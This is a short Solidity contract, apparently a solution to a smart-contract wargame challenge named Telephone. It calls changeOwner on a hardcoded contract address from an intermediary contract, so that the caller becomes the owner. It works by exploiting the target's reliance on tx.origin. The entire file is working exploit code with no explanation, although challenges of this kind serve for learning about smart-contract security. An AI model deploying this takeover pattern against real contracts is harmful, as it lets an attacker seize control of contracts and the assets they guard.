// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface ITelephone {
    function changeOwner(address _owner) external;
}

contract TelephoneTakeover {
    function takeover() public {
        ITelephone(0x132475b6113404C92ae110Abc7D37555c65d1404).changeOwner(
            msg.sender
        );
    }
}
